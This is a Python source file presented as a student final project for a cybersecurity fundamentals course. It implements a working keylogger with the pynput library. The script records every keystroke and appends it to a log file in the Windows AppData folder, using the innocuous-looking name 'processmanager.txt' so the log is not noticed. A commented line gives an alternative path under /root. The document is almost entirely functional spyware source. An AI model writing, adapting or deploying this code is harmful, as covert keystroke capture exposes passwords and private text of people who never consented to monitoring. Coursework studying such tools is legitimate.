"""
    Fundamentals of Cybersecurity Final Project - KEYLOGGER

    PREPARED BY:
    Abel Seyoum		ATE/8832/12
    Abebe Mihiretu	ATE/9421/12
    Abdulfeta Sani	ATE/4581/12
    Abenezer Genene	ATE/7579/12
    Gizework Tezera	ATE/7612/12

    ADVISOR: Mr. Temesgen Kitaw

    Date: June 26, 2023
"""

import os
from pynput.keyboard import Listener

keys = []
count = 0
path = os.environ['appdata'] + '\\processmanager.txt'
# path = '/root/processmanager.txt'     #For Linux OS
# path = 'processmanager.txt'           #For Windows - Saves the log file in the folder where this keylogger is started.


def on_press(key):
    global keys, count

    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(path, 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find('backspace') > 0:
                f.write(' Backspace ')
            elif k.find('enter') > 0:
                f.write('\n')
            elif k.find('shift') > 0:
                f.write(' Shift ')
            elif k.find('space') > 0:
                f.write(' ')
            elif k.find('caps_lock') > 0:
                f.write(' caps_lock ')
            elif k.find('Key'):
                f.write(k)


with Listener(on_press=on_press) as listener:
    listener.join()
